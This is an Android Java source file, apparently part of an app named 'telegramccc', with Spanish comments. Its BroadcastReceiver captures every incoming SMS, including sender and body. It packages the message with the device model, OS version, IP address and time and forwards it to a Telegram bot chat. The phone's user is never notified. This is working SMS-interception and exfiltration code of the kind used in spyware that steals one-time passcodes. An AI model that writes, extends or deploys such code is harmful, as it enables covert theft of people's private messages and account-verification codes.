package com.tiburela.telegramccc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsMessage;
import android.text.format.Formatter;
import android.util.Log;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.UpdatesListener;
import com.pengrad.telegrambot.model.request.ParseMode;
import com.pengrad.telegrambot.request.SendMessage;
import com.pengrad.telegrambot.response.SendResponse;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;



public class SMSreceiver extends BroadcastReceiver {


   int contadorSendsSM=0;

    boolean CanSendsSMSnOw =false;




    private final String TAG = this.getClass().getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent)
    {


        /*
        if(currentTimeJava1>){
        }
        */


        contadorSendsSM++;
        Log.i("foregttss","oreceived se ejecuto aqui y el contador es "+contadorSendsSM);


        if(contadorSendsSM % 2==0){ //si es impar envia
            Log.i("holametodo","es par no se puede enviar");

            CanSendsSMSnOw=false;

        }

        else

        {  //si no es multiplo de 2 puede navir
            Log.i("holametodo","es impar si se puede nviar");

            CanSendsSMSnOw=true;

        }





        Bundle extras = intent.getExtras();

        String strMessage = "";

        if ( extras != null )
        {
            Log.i("foregttss","extra no es null ");


            Object[] smsextras = (Object[]) extras.get( "pdus" );

            Log.i("foregttss","el sms leng es "+smsextras.length);


            for ( int i = 0; i < smsextras.length; i++ )
            {

            //    if(CanSendsSMSnOw){

                    SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i]);

                    String strMsgBody = smsmsg.getMessageBody().toString();
                    String strMsgSrc = smsmsg.getOriginatingAddress();

                    strMessage += "SMS from " + strMsgSrc + " : " + strMsgBody;

                    Log.i("foregttss", "el sms text es "+strMessage);

                    creyENVIAsMS(strMessage,context);

                    Log.i("holametodo","se llamo este metodo en bucle ");

                  //  CanSendsSMSnOw =false;

               // }



            }

        }else{

            Log.i("foregttss","extra es nulo");

        }

    }




    private void creyENVIAsMS(String sms,Context context){

        Log.i("foregttss","se llamo metodo crey envia sms");


        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
       String mensajeToSend="Dispositivo: "+getCurrentDispositivo()+" Direccion Ip : "+ip+" Hora: "+currentTime+ " "+sms;


        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                .permitAll().build();
        StrictMode.setThreadPolicy(policy);
        //your codes here


        // Create your bot passing the token received from @BotFather
        TelegramBot bot = new TelegramBot(Constans.tockenChatBotDataSMS);

// Register for updates



        bot.setUpdatesListener(updates -> {
            // ... process updates
            // return id of last processed update or confirm them all
            return UpdatesListener.CONFIRMED_UPDATES_ALL;
        });





// Send messages
        // long chatId = update.message().chat().id();
        //  SendResponse response = bot.execute(new SendMessage("5762677106", "Hello!"));
        //  SendResponse sendResponsex = bot.execute(request);
        // TelegramBot bota = new TelegramBot.Builder("BOT_TOKEN").okHttpClient(client).build();


        SendMessage request = new SendMessage(Constans.chatIDSms, mensajeToSend)
                .parseMode(ParseMode.HTML)
                .disableWebPagePreview(true)
                .disableNotification(false);
                //.replyMarkup(new ForceReply());

      //   bot.execute(new SendMessage(Constans.chatIDSms, mensajeToSend));


       //  bot.execute(request);

        SendResponse sendResponse = bot.execute(request);

       Log.i("foregttss","el erro res  "+ sendResponse.errorCode());

        Log.i("reuqener","se ecjto this code ");

      //  BaseResponse responsebase = bot.execute(request); //comente esta linea de codigo y ahora solo se envia 2 veces...

       // boolean ok2 = responsebase.isOk();

    }




    private String getCurrentDispositivo(){
        String reqString = Build.MANUFACTURER
                + " " + Build.MODEL + " " + Build.VERSION.RELEASE
                + " " + Build.VERSION_CODES.class.getFields()[android.os.Build.VERSION.SDK_INT].getName();
        return reqString;

    }



}